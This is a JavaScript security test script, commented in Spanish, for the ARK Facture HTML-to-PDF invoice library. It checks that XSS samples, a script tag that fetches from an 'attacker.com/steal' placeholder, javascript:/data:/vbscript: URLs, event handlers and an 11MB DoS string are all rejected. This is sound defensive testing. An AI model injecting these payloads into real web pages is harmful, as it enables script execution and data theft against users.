/**
 * ARK Facture v4.0 - Pruebas de Seguridad
 * Verifica que todas las validaciones de seguridad funcionen correctamente
 * 
 * Uso:
 * npm install ark_facture
 * node examples/security-test.js
 */

import ArkFacture from '../pkg/index.js';
import * as pdfGenerator from '../pkg/pdf-generator.js';

async function testXssPrevention() {
  console.log('\n🔒 TEST 1: Prevención de XSS');
  console.log('─'.repeat(50));

  const htmlXss = '<img src=x onerror="alert(\'XSS\')">';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlXss);
    console.log('❌ FALLO: XSS no fue bloqueado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: XSS bloqueado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testScriptInjection() {
  console.log('\n🔒 TEST 2: Prevención de Inyección de Scripts');
  console.log('─'.repeat(50));

  const htmlScript = '<script>fetch("http://attacker.com/steal")</script>';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlScript);
    console.log('❌ FALLO: Script injection no fue bloqueado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: Script injection bloqueado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testJavascriptProtocol() {
  console.log('\n🔒 TEST 3: Prevención de Protocolo javascript:');
  console.log('─'.repeat(50));

  const htmlJavascript = '<a href="javascript:alert(\'XSS\')">Click</a>';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlJavascript);
    console.log('❌ FALLO: javascript: protocol no fue bloqueado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: javascript: protocol bloqueado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testDataProtocol() {
  console.log('\n🔒 TEST 4: Prevención de Protocolo data:');
  console.log('─'.repeat(50));

  const htmlData = '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlData);
    console.log('❌ FALLO: data: protocol no fue bloqueado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: data: protocol bloqueado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testDosPrevention() {
  console.log('\n🔒 TEST 5: Prevención de Ataque DoS (HTML Grande)');
  console.log('─'.repeat(50));

  // Crear HTML de 11MB (excede límite de 10MB)
  const htmlGrande = '<html><body>' + 'A'.repeat(11 * 1024 * 1024) + '</body></html>';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlGrande);
    console.log('❌ FALLO: DoS no fue bloqueado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: DoS bloqueado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testInvalidHtml() {
  console.log('\n🔒 TEST 6: Validación de HTML Inválido');
  console.log('─'.repeat(50));

  try {
    await pdfGenerator.generarPdfDesdeHtml(null);
    console.log('❌ FALLO: HTML null no fue rechazado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: HTML null rechazado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testEmptyHtml() {
  console.log('\n🔒 TEST 7: Validación de HTML Vacío');
  console.log('─'.repeat(50));

  try {
    await pdfGenerator.generarPdfDesdeHtml('');
    console.log('❌ FALLO: HTML vacío no fue rechazado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: HTML vacío rechazado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testValidHtml() {
  console.log('\n✅ TEST 8: HTML Válido Acepta');
  console.log('─'.repeat(50));

  const htmlValido = `
    <!DOCTYPE html>
    <html>
    <head><title>Test</title></head>
    <body>
      <h1>Comprobante de Venta</h1>
      <p>Contenido seguro</p>
    </body>
    </html>
  `;

  try {
    const resultado = await pdfGenerator.generarPdfDesdeHtml(htmlValido);
    if (resultado.exitoso) {
      console.log('✅ PASÓ: HTML válido aceptado');
      console.log('   Método:', resultado.metodo);
      console.log('   Tamaño:', resultado.tamaño_bytes, 'bytes');
      return true;
    } else {
      console.log('⚠️ ADVERTENCIA: HTML válido pero PDF no generado');
      console.log('   Razón:', resultado.advertencia);
      return true; // No es fallo de seguridad
    }
  } catch (error) {
    console.log('❌ FALLO: HTML válido fue rechazado');
    console.log('   Mensaje:', error.message);
    return false;
  }
}

async function testEventHandlers() {
  console.log('\n🔒 TEST 9: Prevención de Event Handlers');
  console.log('─'.repeat(50));

  const htmlEventHandlers = '<div onclick="alert(\'XSS\')" onmouseover="alert(\'XSS\')">Test</div>';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlEventHandlers);
    console.log('❌ FALLO: Event handlers no fueron bloqueados');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: Event handlers bloqueados');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function testVbscriptProtocol() {
  console.log('\n🔒 TEST 10: Prevención de Protocolo vbscript:');
  console.log('─'.repeat(50));

  const htmlVbscript = '<a href="vbscript:msgbox(\'XSS\')">Click</a>';

  try {
    await pdfGenerator.generarPdfDesdeHtml(htmlVbscript);
    console.log('❌ FALLO: vbscript: protocol no fue bloqueado');
    return false;
  } catch (error) {
    console.log('✅ PASÓ: vbscript: protocol bloqueado');
    console.log('   Mensaje:', error.message);
    return true;
  }
}

async function runAllTests() {
  console.log('\n');
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║  🔐 ARK Facture v4.0 - Pruebas de Seguridad           ║');
  console.log('╚════════════════════════════════════════════════════════╝');

  const tests = [
    testXssPrevention,
    testScriptInjection,
    testJavascriptProtocol,
    testDataProtocol,
    testDosPrevention,
    testInvalidHtml,
    testEmptyHtml,
    testEventHandlers,
    testVbscriptProtocol,
    testValidHtml,
  ];

  const resultados = [];

  for (const test of tests) {
    try {
      const resultado = await test();
      resultados.push(resultado);
    } catch (error) {
      console.error('❌ Error ejecutando test:', error.message);
      resultados.push(false);
    }
  }

  // Resumen
  console.log('\n');
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║  📊 RESUMEN DE PRUEBAS                                ║');
  console.log('╚════════════════════════════════════════════════════════╝');

  const pasadas = resultados.filter(r => r).length;
  const totales = resultados.length;
  const porcentaje = ((pasadas / totales) * 100).toFixed(1);

  console.log(`\n✅ Pruebas pasadas: ${pasadas}/${totales}`);
  console.log(`📊 Porcentaje: ${porcentaje}%`);

  if (pasadas === totales) {
    console.log('\n🎉 ¡TODAS LAS PRUEBAS DE SEGURIDAD PASARON!');
    console.log('✅ La librería es segura para usar en producción\n');
  } else {
    console.log('\n⚠️ ALGUNAS PRUEBAS FALLARON');
    console.log('❌ Revisa los errores arriba\n');
  }

  return pasadas === totales;
}

// Ejecutar pruebas
runAllTests().catch(console.error);
